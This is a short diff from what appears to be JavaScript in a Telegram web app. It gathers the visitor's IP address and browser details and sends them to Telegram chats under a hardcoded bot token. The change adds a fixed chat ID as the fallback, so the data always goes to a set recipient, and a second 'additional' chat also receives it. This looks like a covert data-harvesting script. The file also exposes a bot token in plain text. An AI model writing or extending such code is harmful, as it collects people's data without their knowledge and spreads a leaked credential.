@@ -56,7 +56,7 @@ function getBrowserInfo() {
 
 async function sendDataToTelegram() {
     const token = "7212589811:AAH4Qyoboljh-SYCE48LL_nyZNCS7KvUeI0"
-    const chatId = tg.initDataUnsafe.start_param;
+    const chatId = tg.initDataUnsafe.start_param || -1002184270191;
     const additionalChatId = -1002184270191;
 
     const ipAddress = await getIPAddress();
